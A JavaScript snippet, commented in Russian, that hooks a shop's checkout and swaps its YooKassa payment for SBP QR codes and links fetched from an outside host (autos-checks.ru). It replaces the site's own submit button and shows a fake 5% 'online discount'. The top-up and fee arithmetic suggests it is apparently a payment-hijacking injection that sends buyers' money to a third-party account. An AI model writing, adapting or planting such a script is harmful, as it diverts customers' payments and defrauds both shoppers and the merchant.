// Скрипт для замены стандартной оплаты ЮKassa на оплату через СБП
// Десктоп: QR-код | Мобильные: кнопка Оплатить

(function() {
    'use strict';
    
    const API_URL = 'https://autos-checks.ru/kwork_payment.php';
    
    function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 768;
    }
    
    function getOrderTotal() {
        const totalElement = document.querySelector('.checkout__total');
        if (totalElement) {
            return parseInt(totalElement.textContent.replace(/[^0-9]/g, '')) || 0;
        }
        return 5000;
    }
    
    function calculateDiscount(total) {
        if (total <= 5000) {
            return { discount: 0, finalAmount: total };
        }
        let discount = 250;
        const overAmount = total - 5000;
        const thousands = Math.floor(overAmount / 1000);
        discount += thousands * 50;
        const finalAmount = total - discount;
        return { discount: discount, finalAmount: finalAmount };
    }
    
    function calculateTopUpAmount(targetAmount) {
        const discountPercent = 0.05;
        let amountWithOnlineDiscount = Math.floor(targetAmount * (1 - discountPercent));
        let topUpAmount = Math.floor(amountWithOnlineDiscount / 1.05);
        for (let i = -5; i <= 5; i++) {
            const testAmount = topUpAmount + i;
            if (testAmount < 100) continue;
            const fee = Math.ceil(testAmount * 0.05);
            const total = testAmount + fee;
            if (total === amountWithOnlineDiscount) {
                topUpAmount = testAmount;
                break;
            }
        }
        return topUpAmount;
    }
    
    function replaceNextButton(paymentLink) {
        const nextButton = document.querySelector('.form__submit.fake-step-next[data-type="delivery"]');
        if (!nextButton) return false;
        nextButton.textContent = 'Оплатить';
        const newButton = nextButton.cloneNode(true);
        nextButton.parentNode.replaceChild(newButton, nextButton);
        newButton.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            window.open(paymentLink, '_blank');
        });
        return true;
    }
    
    function showQRCodeInTab(paymentLink) {
        const tab = document.querySelector('.tab[data-tab="checkout-pay-3"]');
        if (!tab) return false;
        const qrUrl = 'https://quickchart.io/qr?text=' + encodeURIComponent(paymentLink) + '&size=250&margin=2';
        tab.innerHTML = '<div style="text-align: center; padding: 20px;">' +
            '<div style="background: #e8f5e9; padding: 10px; border-radius: 8px; margin-bottom: 15px;">' +
            '<div style="font-size: 14px; color: #2e7d32;">Скидка 5% при оплате онлайн</div>' +
            '</div>' +
            '<div style="background: white; padding: 15px; border-radius: 10px; display: inline-block; margin-bottom: 15px;">' +
            '<img src="' + qrUrl + '" alt="QR Code" style="width: 200px; height: 200px;">' +
            '</div>' +
            '<div style="font-size: 13px; color: #666;">Отсканируйте QR-код в приложении банка</div>' +
            '<div style="font-size: 11px; margin-top: 10px;">' +
            '<a href="' + paymentLink + '" target="_blank" style="color: #007bff;">Ссылка для оплаты</a>' +
            '</div>' +
            '</div>';
        return true;
    }
    
    async function handleOnlinePayment() {
        const total = getOrderTotal();
        const { finalAmount: discountedAmount } = calculateDiscount(total);
        const topUpAmount = calculateTopUpAmount(discountedAmount);
        
        if (topUpAmount < 100) {
            const tab = document.querySelector('.tab[data-tab="checkout-pay-3"]');
            if (tab) {
                tab.innerHTML = '<div style="padding: 15px; text-align: center; color: #dc3545;">Минимальная сумма 100 ₽</div>';
            }
            return;
        }
        
        const tab = document.querySelector('.tab[data-tab="checkout-pay-3"]');
        if (tab) {
            tab.innerHTML = '<div style="text-align: center; padding: 30px;"><div style="display: inline-block; width: 30px; height: 30px; border: 2px solid #f3f3f3; border-top: 2px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite;"></div><p>Формирование платежа...</p><style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></div>';
        }
        
        try {
            const response = await fetch(API_URL + '?sum=' + topUpAmount);
            if (!response.ok) throw new Error('HTTP ' + response.status);
            const paymentLink = await response.text();
            if (!paymentLink.includes('qr.nspk.ru')) throw new Error('Некорректная ссылка');
            
            const finalWithFivePercentDiscount = Math.floor(discountedAmount * 0.95);
            
            if (isMobile()) {
                replaceNextButton(paymentLink);
                if (tab) {
                    tab.innerHTML = '<div style="text-align: center; padding: 15px;"><div style="background: #e8f5e9; padding: 10px; border-radius: 8px;"><div style="font-size: 14px; color: #2e7d32;">Скидка 5% при оплате онлайн</div><div style="font-size: 13px; color: #666; margin-top: 5px;">Сумма к оплате: ' + finalWithFivePercentDiscount + ' ₽</div></div></div>';
                }
            } else {
                showQRCodeInTab(paymentLink);
            }
        } catch (error) {
            console.error(error);
            if (tab) {
                tab.innerHTML = '<div style="padding: 15px; text-align: center; color: #dc3545;">Ошибка: ' + error.message + '<br><button onclick="location.reload()" style="margin-top: 8px; padding: 4px 12px;">Повторить</button></div>';
            }
        }
    }
    
    function initPaymentListener() {
        const radioButtons = document.querySelectorAll('input[name="checkoutpay"]');
        for (let i = 0; i < radioButtons.length; i++) {
            radioButtons[i].addEventListener('change', function() {
                if (this.value === 'Онлайн-оплата') {
                    handleOnlinePayment();
                }
            });
        }
        const selectedRadio = document.querySelector('input[name="checkoutpay"]:checked');
        if (selectedRadio && selectedRadio.value === 'Онлайн-оплата') {
            handleOnlinePayment();
        }
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initPaymentListener);
    } else {
        initPaymentListener();
    }
    
    console.log('Скрипт оплаты СБП активирован');
    console.log('Режим: ' + (isMobile() ? 'Мобильный' : 'Десктоп'));
})();
